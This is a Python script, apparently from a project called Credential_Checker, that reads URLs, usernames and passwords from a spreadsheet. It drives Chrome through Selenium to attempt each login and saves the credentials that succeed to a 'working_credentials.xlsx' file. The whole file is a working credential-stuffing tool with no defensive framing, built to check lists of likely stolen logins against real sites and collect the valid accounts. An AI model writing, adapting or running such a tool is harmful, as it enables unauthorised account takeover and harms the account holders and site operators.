import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Read the Excel file
input_file_path = r"C:\Users\Hacker\OneDrive\Desktop\Credential_Checker-main\Credential_Checker-main\input.xlsx"  # Change the input file path
def read_excel(input_file_path):
    return pd.read_excel(input_file_path)

df = read_excel(input_file_path)

# Specify the full path to the ChromeDriver executable
chrome_driver_path = r"full\path\to\chromedriver.exe"  # Update with the full path to chromedriver.exe

# Initialize an empty list to store the working credentials
working_credentials = []

def find_element(driver, by, value):
    try:
        element = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((by, value)))
        return element
    except:
        return None

# Iterate over each row in the dataframe
for index, row in df.iterrows():
    url = row['URL']
    username = row['Username']
    password = row['Password']

    # Initialize a new Chrome webdriver for each set of credentials
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")  # Optional: Open browser in maximized mode
    service = Service(chrome_driver_path)
    driver = webdriver.Chrome(service=service, options=options)

    # Open the URL
    driver.get(url)

    try:
        # Try finding the username field by different methods
        username_field = find_element(driver, By.NAME, 'uname') or \
                         find_element(driver, By.ID, 'username') or \
                         find_element(driver, By.CLASS_NAME, 'username') or \
                         find_element(driver, By.CSS_SELECTOR, 'input[name="uname"]') or \
                         find_element(driver, By.CSS_SELECTOR, 'input[name="username"]')
        
        if not username_field:
            raise Exception("Username field not found")

        # Try finding the password field by different methods
        password_field = find_element(driver, By.NAME, 'pass') or \
                         find_element(driver, By.ID, 'password') or \
                         find_element(driver, By.CLASS_NAME, 'password') or \
                         find_element(driver, By.CSS_SELECTOR, 'input[name="pass"]') or \
                         find_element(driver, By.CSS_SELECTOR, 'input[name="password"]')

        if not password_field:
            raise Exception("Password field not found")

        # Scroll the elements into view
        driver.execute_script("arguments[0].scrollIntoView(true);", username_field)
        driver.execute_script("arguments[0].scrollIntoView(true);", password_field)

        # Enter the credentials
        username_field.send_keys(username)
        password_field.send_keys(password)

        # Submit the form
        password_field.submit()

        # Check if login was successful by looking for specific strings in the response
        if "logout" in driver.page_source.lower() or "logged in" in driver.page_source.lower():
            logging.info(f"Login successful for {username}")
            working_credentials.append({'URL': url, 'Username': username, 'Password': password})
        else:
            logging.info(f"Login failed for {username}")
    except Exception as e:
        logging.error(f"An error occurred for {username}: {e}")
    finally:
        driver.quit()  # Quit the browser instance

# Convert the working credentials list to a DataFrame
working_credentials_df = pd.DataFrame(working_credentials)

# Save the working credentials to "working_credentials.xlsx"
working_credentials_df.to_excel("working_credentials.xlsx", index=False)
